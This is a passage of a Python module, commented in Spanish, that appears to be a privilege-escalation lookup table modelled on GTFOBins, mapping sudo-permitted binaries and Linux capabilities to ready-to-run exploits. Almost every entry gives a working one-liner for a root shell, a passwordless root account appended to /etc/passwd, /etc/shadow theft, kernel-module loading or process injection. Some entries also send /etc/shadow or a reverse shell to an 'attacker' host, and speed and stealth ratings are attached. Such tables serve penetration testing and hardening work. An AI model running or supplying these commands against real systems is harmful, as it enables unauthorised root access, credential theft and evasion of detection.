        'exploit': "sudo vim -c ':!/bin/sh'",
        'why': ':! ejecuta comandos del shell con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/vim/#sudo',
    },
    'vi': {
        'verify': 'sudo -n vi --version 2>&1 | head -1',
        'exploit': "sudo vi -c ':!/bin/sh'",
        'why': ':! ejecuta shell con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/vi/#sudo',
    },
    'nano': {
        'verify': 'sudo -n nano --version 2>&1 | head -1',
        'exploit': 'sudo nano  # Ctrl+R, Ctrl+X, luego: reset; sh 1>&0 2>&0',
        'why': 'nano ejecuta comandos externos con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/nano/#sudo',
    },
    'less': {
        'verify_levels': [
            ('precondition',
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*less"',
             'esperado: línea con NOPASSWD que mencione less'),
            ('capability',
             # less con sudoers debe poder ejecutar !; LESSSECURE lo bloquea
             'sudo -nl 2>/dev/null | grep -qi LESSSECURE && echo BLOCKED || echo OK',
             'esperado: OK (LESSSECURE no presente)'),
            # No dry_run: less es interactivo y la ! no se puede invocar non-tty
        ],
        'exploit': 'sudo less /etc/profile  # luego: !/bin/sh',
        'why': 'less spawnea shell con !',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/less/#sudo',
    },
    'more': {
        'verify': 'sudo -n more --version 2>&1 | head -1',
        'exploit': 'sudo more /etc/profile  # luego: !/bin/sh',
        'why': 'more spawnea shell con !',
        'success': 'shell como root',
        'notes': 'Requiere terminal pequeña para activar pager',
        'ref': 'https://gtfobins.github.io/gtfobins/more/#sudo',
    },
    'man': {
        'verify': 'sudo -n man --version 2>&1 | head -1',
        'exploit': 'sudo man man  # luego: !/bin/sh',
        'why': 'man usa pager que permite spawn de shell',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/man/#sudo',
    },
    'awk': {
        'verify_levels': [
            ('precondition',
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*awk"',
             'esperado: línea con NOPASSWD que mencione awk'),
            ('dry_run',
             """sudo -n awk 'BEGIN {system("id")}' 2>&1""",
             'esperado: uid=0(root) en stdout'),
        ],
        'exploit': r"""sudo awk 'BEGIN {system("/bin/sh")}'""",
        'why': 'awk ejecuta system() con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/awk/#sudo',
    },
    'gawk': {
        'verify': 'sudo -n gawk --version 2>&1 | head -1',
        'exploit': r"""sudo gawk 'BEGIN {system("/bin/sh")}'""",
        'why': 'gawk ejecuta system() con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/gawk/#sudo',
    },
    'python': {
        'verify_levels': [
            ('precondition',
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*python(\\b|[^3])"',
             'esperado: línea con NOPASSWD que mencione python (no python3)'),
            ('dry_run',
             'sudo -n python -c "import os; print(\\"DRYRUN_UID=\\", os.getuid())" 2>&1',
             'esperado: DRYRUN_UID= 0'),
        ],
        'exploit': r"""sudo python -c 'import os; os.system("/bin/sh")'""",
        'why': 'os.system spawnea shell con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/python/#sudo',
    },
    'python3': {
        'verify_levels': [
            ('precondition',
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*python3"',
             'esperado: línea con NOPASSWD que mencione python3'),
            ('dry_run',
             'sudo -n python3 -c "import os; print(\\"DRYRUN_UID=\\", os.getuid())" 2>&1',
             'esperado: DRYRUN_UID= 0'),
        ],
        'exploit': r"""sudo python3 -c 'import os; os.system("/bin/sh")'""",
        'why': 'os.system spawnea shell con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/python3/#sudo',
    },
    'perl': {
        'verify': 'sudo -n perl --version 2>&1 | head -2',
        'exploit': r"""sudo perl -e 'exec "/bin/sh";'""",
        'why': 'perl exec() ejecuta shell con privilegios de sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/perl/#sudo',
    },
    'ruby': {
        'verify': 'sudo -n ruby --version 2>&1',
        'exploit': r"""sudo ruby -e 'exec "/bin/sh"'""",
        'why': 'exec() ruby spawnea shell con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/ruby/#sudo',
    },
    'lua': {
        'verify': 'sudo -n lua -v 2>&1',
        'exploit': r"""sudo lua -e 'os.execute("/bin/sh")'""",
        'why': 'lua os.execute spawnea shell con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/lua/#sudo',
    },
    'node': {
        'verify': 'sudo -n node --version 2>&1',
        'exploit': r"""sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]});'""",
        'why': 'child_process spawnea shell con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/node/#sudo',
    },
    'php': {
        'verify': 'sudo -n php --version 2>&1 | head -1',
        'exploit': """sudo php -r 'system("/bin/sh");' """,
        'why': 'system() de PHP ejecuta shell con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/php/#sudo',
    },
    'env': {
        'verify': 'sudo -n env --version 2>&1 | head -1',
        'exploit': 'sudo env /bin/sh',
        'why': 'env ejecuta sh con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/env/#sudo',
    },
    'bash': {
        'verify_levels': [
            ('precondition',
             # Listar reglas sudo no-passwd y matchear el binario
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*bash"',
             'esperado: línea con NOPASSWD que mencione bash'),
            ('dry_run',
             'sudo -n bash -c "id" 2>&1',
             'esperado: uid=0(root) sin pedir password'),
        ],
        'exploit': 'sudo bash',
        'why': 'sudo invoca bash directamente como root',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/bash/#sudo',
    },
    'sh': {
        'verify_levels': [
            ('precondition',
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*\\b(sh|/bin/sh)\\b"',
             'esperado: línea con NOPASSWD que mencione sh'),
            ('dry_run',
             'sudo -n sh -c "id" 2>&1',
             'esperado: uid=0(root) sin pedir password'),
        ],
        'exploit': 'sudo sh',
        'why': 'sudo invoca sh directamente como root',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/sh/#sudo',
    },
    'tee': {
        'verify': 'sudo -n tee --version 2>&1 | head -1',
        'exploit': r"""echo 'root2::0:0:::/bin/bash' | sudo tee -a /etc/passwd""",
        'why': 'tee con sudo escribe a archivos protegidos',
        'success': 'línea agregada a /etc/passwd, luego: su root2',
        'speed': 3,
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/tee/#sudo',
    },
    'cp': {
        'verify': 'sudo -n cp --version 2>&1 | head -1',
        'exploit': 'sudo cp /etc/shadow /tmp/shadow.copy && sudo chmod 644 /tmp/shadow.copy',
        'why': 'cp con sudo lee archivos protegidos',
        'success': '/etc/shadow accesible',
        'speed': 3,
        'ref': 'https://gtfobins.github.io/gtfobins/cp/#sudo',
    },
    'mv': {
        'verify': 'sudo -n mv --version 2>&1 | head -1',
        'exploit': 'sudo mv /tmp/shell.sh /etc/cron.d/rooter',
        'why': 'mv con sudo permite escribir donde sea',
        'success': 'cron ejecuta el script como root',
        'speed': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/mv/#sudo',
    },
    'chmod': {
        'verify': 'sudo -n chmod --version 2>&1 | head -1',
        'exploit': 'sudo chmod u+s /bin/bash  # luego: bash -p',
        'why': 'chmod con sudo agrega SUID a binarios',
        'success': 'bash con SUID; bash -p da euid=0',
        'speed': 4,
        'ref': 'https://gtfobins.github.io/gtfobins/chmod/#sudo',
    },
    'chown': {
        'verify': 'sudo -n chown --version 2>&1 | head -1',
        'exploit': 'sudo chown $(whoami):$(whoami) /etc/shadow',
        'why': 'chown con sudo cambia owner de archivos críticos',
        'success': '/etc/shadow accesible para crackear',
        'speed': 3,
        'ref': 'https://gtfobins.github.io/gtfobins/chown/#sudo',
    },
    'dd': {
        'verify': 'sudo -n dd --version 2>&1 | head -1',
        'exploit': """echo 'root2::0:0:::/bin/bash' | sudo dd of=/etc/passwd oflag=append conv=notrunc""",
        'why': 'dd con sudo escribe a archivos arbitrarios',
        'success': 'línea agregada a /etc/passwd',
        'speed': 3,
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/dd/#sudo',
    },
    'tar': {
        'verify': 'sudo -n tar --version 2>&1 | head -1',
        'exploit': r"""sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh""",
        'why': '--checkpoint-action ejecuta comandos durante el archive',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/tar/#sudo',
    },
    'zip': {
        'verify': 'sudo -n zip --version 2>&1 | head -2',
        'exploit': 'TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT "sh #"',
        'why': '-TT ejecuta comando como tester con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/zip/#sudo',
    },
    'apt': {
        'verify': 'sudo -n apt --version 2>&1 | head -1',
        'exploit': 'sudo apt changelog apt  # luego en pager: !/bin/sh',
        'why': 'apt usa pager que permite spawn de shell',
        'success': 'shell como root',
        'notes': 'En versiones viejas: sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh',
        'ref': 'https://gtfobins.github.io/gtfobins/apt/#sudo',
    },
    'apt-get': {
        'verify': 'sudo -n apt-get --version 2>&1 | head -1',
        'exploit': 'sudo apt-get changelog apt  # luego: !/bin/sh',
        'why': 'apt-get usa pager para changelog',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/apt-get/#sudo',
    },
    'systemctl': {
        'verify': 'sudo -n systemctl --version 2>&1 | head -1',
        'exploit': 'sudo systemctl status anything  # luego: !/bin/sh',
        'why': 'systemctl status usa pager (less)',
        'success': 'shell como root',
        'notes': 'Requiere terminal pequeña para activar pager',
        'ref': 'https://gtfobins.github.io/gtfobins/systemctl/#sudo',
    },
    'journalctl': {
        'verify': 'sudo -n journalctl --version 2>&1 | head -1',
        'exploit': 'sudo journalctl  # luego: !/bin/sh',
        'why': 'journalctl usa pager (less)',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/journalctl/#sudo',
    },
    'git': {
        'verify': 'sudo -n git --version 2>&1',
        'exploit': r"""sudo git -p help config  # luego: !/bin/sh""",
        'why': 'git usa pager con !',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/git/#sudo',
    },
    'make': {
        'verify': 'sudo -n make --version 2>&1 | head -1',
        'exploit': r"""COMMAND='/bin/sh'; sudo make -s --eval=$'x:\n\t-'"$COMMAND" """,
        'why': 'make ejecuta recetas con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/make/#sudo',
    },
    'mysql': {
        'verify': 'sudo -n mysql --version 2>&1',
        'exploit': r"""sudo mysql -e '\! /bin/sh'""",
        'why': '\\! de mysql ejecuta shell con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/mysql/#sudo',
    },
    'sqlite3': {
        'verify': 'sudo -n sqlite3 --version 2>&1',
        'exploit': r"""sudo sqlite3 /dev/null -cmd '.shell /bin/sh'""",
        'why': '.shell de sqlite3 spawnea shell con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/sqlite3/#sudo',
    },
    'docker': {
        'verify': 'sudo -n docker --version 2>&1',
        'exploit': 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
        'why': 'docker monta el host root y chroot da acceso total',
        'success': 'shell como root real del host',
        'stealth': 2,      # bind-mount de / es muy llamativo
        'ref': 'https://gtfobins.github.io/gtfobins/docker/#sudo',
    },
    'rsync': {
        'verify': 'sudo -n rsync --version 2>&1 | head -1',
        'exploit': """sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null""",
        'why': '-e permite ejecutar comando arbitrario con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/rsync/#sudo',
    },
    'nmap': {
        'verify': 'sudo -n nmap --version 2>&1 | head -1',
        'exploit': r"""TF=$(mktemp); echo 'os.execute("/bin/sh")' > $TF; sudo nmap --script=$TF""",
        'why': 'nmap NSE script ejecuta Lua con sudo',
        'success': 'shell como root',
        'ref': 'https://gtfobins.github.io/gtfobins/nmap/#sudo',
    },
    'curl': {
        'verify': 'sudo -n curl --version 2>&1 | head -1',
        'exploit': 'sudo curl file:///etc/shadow',
        'why': 'curl con sudo lee archivos protegidos',
        'success': 'contenido de /etc/shadow',
        'speed': 3,
        'ref': 'https://gtfobins.github.io/gtfobins/curl/#sudo',
    },
    'wget': {
        'verify': 'sudo -n wget --version 2>&1 | head -1',
        'exploit': 'sudo wget --post-file=/etc/shadow http://attacker:8000/',
        'why': 'wget con sudo exfiltra archivos protegidos',
        'success': 'shadow llega al atacante',
        'speed': 3,
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/wget/#sudo',
    },
    'nc': {
        'verify': 'sudo -n nc -h 2>&1 | head -2',
        'exploit': 'sudo nc -e /bin/sh attacker 4444',
        'why': '-e ejecuta sh con sudo al conectar',
        'success': 'reverse shell como root',
        'reliability': 3,  # OpenBSD nc no tiene -e
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/nc/#sudo',
    },
    'socat': {
        'verify': 'sudo -n socat -V 2>&1 | head -1',
        'exploit': 'sudo socat TCP:attacker:4444 EXEC:"/bin/sh",pty,stderr',
        'why': 'EXEC ejecuta shell con sudo',
        'success': 'reverse shell como root',
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/socat/#sudo',
    },
    'gdb': {
        'verify': 'sudo -n gdb --version 2>&1 | head -1',
        'exploit': r"""sudo gdb -nx -ex '!/bin/sh' -ex quit""",
        'why': '! de gdb ejecuta shell con sudo',
        'success': 'shell como root',
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/gdb/#sudo',
    },
    'strace': {
        'verify': 'sudo -n strace -V 2>&1',
        'exploit': 'sudo strace -o /dev/null /bin/sh',
        'why': 'strace ejecuta el target con sudo',
        'success': 'shell como root',
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/strace/#sudo',
    },
    'ltrace': {
        'verify': 'sudo -n ltrace -V 2>&1',
        'exploit': 'sudo ltrace -o /dev/null /bin/sh',
        'why': 'ltrace ejecuta el target con sudo',
        'success': 'shell como root',
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/ltrace/#sudo',
    },
    'find_wildcard': {
        'verify': '# Aplica cuando sudoers permite: find ... *',
        'exploit': r"""touch -- '-exec=/bin/sh -i ;'  # en el directorio del wildcard""",
        'why': 'wildcard expande argumentos como flags de find',
        'success': 'find ejecuta -exec spawneando shell',
        'notes': 'Variante de wildcard injection — aplica también a tar, chown, rsync',
        'reliability': 2,  # depende del pattern exacto del wildcard
        'speed': 3,
        'ref': 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks',
    },
}

# ─── CAPABILITIES ─────────────────────────────────────────────────────────────
# Cada capability puede explotarse de forma específica si está activa
# en un binario que el usuario puede ejecutar.

CAPABILITIES = {
    'cap_setuid': {
        'severity': 'critical',
        'description': 'Permite cambiar el UID del proceso a cualquier valor',
        'exploits': {
            'python': {
                'verify_levels': [
                    ('precondition',
                     'getcap $(which python) 2>/dev/null | grep cap_setuid',
                     'esperado: línea con cap_setuid en el binario'),
                    ('dry_run',
                     'python -c "import os; os.setuid(0); print(\\"DRYRUN_UID=\\", os.getuid())" 2>&1',
                     'esperado: DRYRUN_UID= 0'),
                ],
                'exploit': r"""python -c 'import os; os.setuid(0); os.system("/bin/sh")'""",
                'why': 'os.setuid(0) eleva a root con esta capability',
                'success': 'shell como root',
            },
            'python3': {
                'verify_levels': [
                    ('precondition',
                     'getcap $(which python3) 2>/dev/null | grep cap_setuid',
                     'esperado: línea con cap_setuid en el binario'),
                    ('dry_run',
                     'python3 -c "import os; os.setuid(0); print(\\"DRYRUN_UID=\\", os.getuid())" 2>&1',
                     'esperado: DRYRUN_UID= 0'),
                ],
                'exploit': r"""python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'""",
                'why': 'os.setuid(0) eleva a root con cap_setuid',
                'success': 'shell como root',
            },
            'perl': {
                'verify': 'getcap $(which perl) 2>/dev/null',
                'exploit': r"""perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'""",
                'why': 'POSIX::setuid eleva a root con cap_setuid',
                'success': 'shell como root',
            },
            'ruby': {
                'verify': 'getcap $(which ruby) 2>/dev/null',
                'exploit': r"""ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'""",
                'why': 'Process::Sys.setuid eleva a root',
                'success': 'shell como root',
            },
            'node': {
                'verify': 'getcap $(which node) 2>/dev/null',
                'exploit': r"""node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio:[0,1,2]});'""",
                'why': 'process.setuid(0) eleva con cap_setuid',
                'success': 'shell como root',
            },
            'php': {
                'verify': 'getcap $(which php) 2>/dev/null',
                'exploit': """php -r 'posix_setuid(0); system("/bin/sh");' """,
                'why': 'posix_setuid eleva a root',
                'success': 'shell como root',
            },
            'gdb': {
                'verify': 'getcap $(which gdb) 2>/dev/null',
                'exploit': r"""gdb -nx -ex 'python import os; os.setuid(0); os.execl("/bin/sh","sh")' -ex quit""",
                'why': 'gdb embebe Python con setuid disponible',
                'success': 'shell como root',
            },
        },
    },
    'cap_setgid': {
        'severity': 'high',
        'description': 'Permite cambiar el GID, útil combinado con grupos privilegiados',
        'exploits': {
            'python': {
                'verify': 'getcap $(which python) 2>/dev/null',
                'exploit': r"""python -c 'import os; os.setgid(0); os.system("/bin/sh")'""",
                'why': 'cambia gid efectivo a root group',
                'success': 'gid=0 — útil si /etc/shadow es root:root mode 040',
            },
        },
    },
    'cap_dac_read_search': {
        'severity': 'high',
        'description': 'Permite leer cualquier archivo, ignorando permisos DAC',
        'exploits': {
            'python': {
                'verify_levels': [
                    ('precondition',
                     'getcap $(which python) 2>/dev/null | grep cap_dac_read_search',
                     'esperado: línea con cap_dac_read_search'),
                    ('dry_run',
                     # Leer solo los primeros 20 chars del header de shadow para confirmar acceso
                     # sin exfiltrar el archivo completo
                     'python -c "print(\\"DRYRUN_SHADOW=\\", open(\\"/etc/shadow\\").readline()[:20])" 2>&1',
                     'esperado: DRYRUN_SHADOW= con texto del primer usuario (ej: "root:")'),
                ],
                'exploit': r"""python -c 'print(open("/etc/shadow").read())'""",
                'why': 'cap_dac_read_search ignora permisos al abrir archivos',
                'success': 'contenido de /etc/shadow visible',
            },
            'tar': {
                'verify': 'getcap $(which tar) 2>/dev/null',
                'exploit': 'tar -czf /tmp/loot.tgz /etc/shadow /root/.ssh/',
                'why': 'tar lee con cap_dac_read_search activa',
                'success': 'archivos sensibles archivados',
            },
        },
    },
    'cap_dac_override': {
        'severity': 'critical',
        'description': 'Permite leer Y escribir cualquier archivo, ignorando DAC',
        'exploits': {
            'python': {
                'verify': 'getcap $(which python) 2>/dev/null',
                'exploit': r"""python -c "open('/etc/passwd','a').write('root2::0:0:::/bin/bash\n')" """,
                'why': 'cap_dac_override permite escritura arbitraria',
                'success': 'usuario root2 sin password agregado; luego: su root2',
            },
        },
    },
    'cap_sys_admin': {
        'severity': 'critical',
        'description': 'Capability "casi root" — permite mount, namespace, raw I/O y más',
        'exploits': {
            'mount': {
                'verify': 'getcap $(which mount) 2>/dev/null',
                'exploit': 'mount -o bind /etc/shadow /tmp/shadow_visible',
                'why': 'cap_sys_admin permite operaciones de mount sin ser root',
                'success': '/etc/shadow accesible vía bind mount',
            },
            'unshare': {
                'verify': 'getcap $(which unshare) 2>/dev/null',
                'exploit': 'unshare -r /bin/sh  # crea namespace con uid 0 mapeado',
                'why': 'cap_sys_admin permite crear user namespaces',
                'success': 'shell con uid 0 dentro del namespace (no root real, pero útil)',
            },
        },
    },
    'cap_sys_ptrace': {
        'severity': 'critical',
        'description': 'Permite trazar e inyectar en cualquier proceso, incluido root',
        'exploits': {
            'gdb': {
                'verify': 'getcap $(which gdb) 2>/dev/null',
                'exploit': r"""# 1. Identificar PID de un proceso root: ps -ef | grep root
# 2. gdb -p <PID> -ex 'call (int)system("/bin/sh")' -ex detach -ex quit""",
                'why': 'cap_sys_ptrace permite attach a procesos de otros UIDs',
                'success': 'comando ejecutado en contexto del proceso root',
                'speed': 3,        # identificar PID + attach
                'stealth': 2,      # ptrace activity es muy llamativa
            },
        },
    },
    'cap_sys_module': {
        'severity': 'critical',
        'description': 'Permite cargar kernel modules — ejecución arbitraria en kernel',
        'exploits': {
            'insmod': {
                'verify': 'getcap $(which insmod) 2>/dev/null',
                'exploit': '# Compilar módulo .ko malicioso y: insmod ./rooter.ko',
                'why': 'cap_sys_module carga código en el kernel sin ser root',
                'success': 'código del módulo ejecutado en ring 0',
                'reliability': 2,  # requiere compilar .ko para kernel exacto
                'speed': 2,
                'stealth': 1,      # carga de módulo aparece en dmesg
            },
        },
    },
    'cap_sys_rawio': {
        'severity': 'critical',
        'description': 'Permite acceso raw a dispositivos — leer/escribir disco directo',
        'exploits': {
            'dd': {
                'verify': 'getcap $(which dd) 2>/dev/null',
                'exploit': '# Leer raw del disco bloqueando filesystem; complejo, ver HackTricks',
                'why': 'cap_sys_rawio bypassa el filesystem — acceso a disco directo',
                'success': 'lectura/escritura de bloques arbitrarios',
                'notes': 'Requiere conocimiento del layout del filesystem',
                'reliability': 1,
                'speed': 1,
                'stealth': 2,
            },
        },
    },
    'cap_net_raw': {
        'severity': 'medium',
        'description': 'Permite sockets raw — sniffing y spoofing en la red local',
        'exploits': {
            'tcpdump': {
                'verify': 'getcap $(which tcpdump) 2>/dev/null',
                'exploit': 'tcpdump -i any -w /tmp/capture.pcap',
                'why': 'cap_net_raw permite captura de tráfico sin ser root',
                'success': 'captura de paquetes incluyendo credenciales en plaintext',
                'speed': 2,        # captura requiere esperar tráfico
                'stealth': 2,      # tcpdump corriendo es notable
            },
        },
    },
    'cap_net_bind_service': {
        'severity': 'low',
        'description': 'Permite bind a puertos < 1024 — útil para spoofear servicios',
        'exploits': {
            'python': {
                'verify': 'getcap $(which python) 2>/dev/null',
                'exploit': '# python -c \'import socket; s=socket.socket(); s.bind(("",80))\'',
                'why': 'permite escuchar en puertos privilegiados',
                'success': 'servicio falso en puerto 80/443/etc.',
                'reliability': 2,  # NO da root, solo bind
                'speed': 1,        # requiere atraer tráfico de víctimas
                'stealth': 2,
            },
        },
    },
    'cap_chown': {
        'severity': 'high',
        'description': 'Permite chown arbitrario — reasignar owner de archivos críticos',
        'exploits': {
            'chown': {
                'verify': 'getcap $(which chown) 2>/dev/null',
                'exploit': 'chown $(whoami) /etc/shadow',
                'why': 'cap_chown permite reasignar archivos',
                'success': 'shadow accesible para crackear',
            },
        },
    },
    'cap_fowner': {
        'severity': 'high',
        'description': 'Permite operaciones que normalmente requieren ser owner del archivo',
        'exploits': {
            'chmod': {
                'verify': 'getcap $(which chmod) 2>/dev/null',
                'exploit': 'chmod 777 /etc/shadow',
                'why': 'cap_fowner permite chmod sobre archivos ajenos',
                'success': 'shadow world-writable',
            },
        },
    },
}


# ─── API pública ──────────────────────────────────────────────────────────────

def lookup_suid(binary: str) -> dict | None:
    """Busca técnica SUID por nombre de binario. Devuelve dict o None."""
    return SUID.get(binary)


def lookup_sudo(binary: str) -> dict | None:
    """Busca técnica sudo por nombre de binario."""
    return SUDO.get(binary)


def lookup_capability(cap: str) -> dict | None:
    """Busca info y exploits de una capability dada."""
    return CAPABILITIES.get(cap.lower())


def all_suid_binaries() -> list[str]:
    """Lista nombres de binarios con técnica SUID disponible."""
    return sorted(SUID.keys())


def all_sudo_binaries() -> list[str]:
    """Lista nombres de binarios con técnica sudo disponible."""
    return sorted(SUDO.keys())


def all_capabilities() -> list[str]:
    """Lista capabilities con explotación documentada."""
    return sorted(CAPABILITIES.keys())


def coverage_summary() -> dict:
    """Devuelve resumen de qué cubre la base — útil para --version o tests."""
    return {
        'suid_count': len(SUID),
        'sudo_count': len(SUDO),
        'capabilities_count': len(CAPABILITIES),
        'capability_techniques_count': sum(
            len(c.get('exploits', {})) for c in CAPABILITIES.values()
        ),
    }


if __name__ == '__main__':
    # Permite ejecutar `python3 gtfobins.py` para ver coverage
    import json
    print(json.dumps(coverage_summary(), indent=2))
    